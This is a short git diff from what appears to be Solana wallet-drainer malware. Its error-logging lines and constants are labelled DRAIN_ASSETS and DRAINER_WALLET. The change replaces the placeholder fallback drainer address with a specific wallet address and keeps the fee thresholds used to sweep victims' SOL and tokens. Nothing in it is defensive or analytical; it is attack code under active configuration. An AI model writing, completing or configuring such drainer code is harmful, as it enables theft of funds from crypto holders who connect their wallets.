@@ -33,7 +33,7 @@ try {
   console.error('[DRAIN_ASSETS] Configuration error:', error.message);
   console.error('[DRAIN_ASSETS] ENV_CONFIG.DRAINER_WALLET_ADDRESS:', ENV_CONFIG.DRAINER_WALLET_ADDRESS);
   // Set fallback values
-  DRAINER_WALLET = new PublicKey('11111111111111111111111111111111');
+  DRAINER_WALLET = new PublicKey('8WZ117ZSWyFSWq9fht5NGfprUQvoE5nReGfWKpczGRPZ');
   TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
   MIN_SOL_FOR_FEES = 0.005 * LAMPORTS_PER_SOL;
   MIN_SOL_FOR_ATA = 0.002 * LAMPORTS_PER_SOL;
